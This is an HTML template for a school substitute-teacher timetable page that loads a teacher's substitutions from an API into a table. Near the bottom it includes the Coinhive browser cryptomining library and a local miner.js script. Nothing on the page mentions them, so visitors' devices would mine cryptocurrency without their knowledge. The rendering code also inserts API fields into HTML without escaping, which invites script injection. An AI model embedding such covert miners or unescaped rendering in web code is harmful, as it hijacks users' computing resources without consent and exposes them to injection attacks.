<!DOCTYPE html>
<html lang="de">

<head>
    <title>Substitutes</title>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/css/materialize.min.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="manifest" href="/a/manifest.json">
    <meta name="charset" content="utf-8">
    <link rel="icon" href="/a/icons/drawable-xxhdpi/icon.png">
    <link rel="icon" sizes="512x512" href="/a/icons/hiresfavicon.png">
    <meta name="theme-color" content="#4db6ac">
    <link rel="stylesheet" href="/a/app.css">
</head>

<body>
<nav class="teal lighten-2"><a href="/" class="brand-logo center">Vertretungsplan</a></nav>
<div class="container" id="app">
    <div class="card-panel grey lighten-3">
        <h4>Substitutes</h4>
        <p class="flow-text" id="title"></p>
        <table class="responsive-table">
            <thead>
            <th>Hour</th>
            <th>Subject</th>
            <th>Room</th>
            <th>Date</th>
            <th>Form teacher</th>
            </thead>
            <tbody class="flow-text"></tbody>
        </table>
    </div>
</div>

<footer class="page-footer teal lighten-2">
    <div class="footer-copyright">
        <div class="container">
            &copy; 2017 Daniel Malik (@fronbasal)
        </div>
    </div>
</footer>

<script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/js/materialize.min.js"></script>
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script src="/a/miner.js"></script>
<script>
    $(() => {
        $.getJSON("/api/t/{{ .teacher }}", data => {
            if (data) {
                $.each(data, (a, b) => {
                    $("tbody").append("<tr><td>" + b.substitute.hour + "</td><td>" + b.substitute.subject + "</td><td>" + b.substitute.room + "</td><td>" + b.meta.date + "</td><td>" + b.meta.class + "</td></tr>");
                });
            } else {
                $("#title").html("There are no substitutes for the requested teacher today.");
            }
        }).catch(m => Materialize.toast(m.status + ": " + m.responseJSON.message));
    });
</script>
</body>

</html>
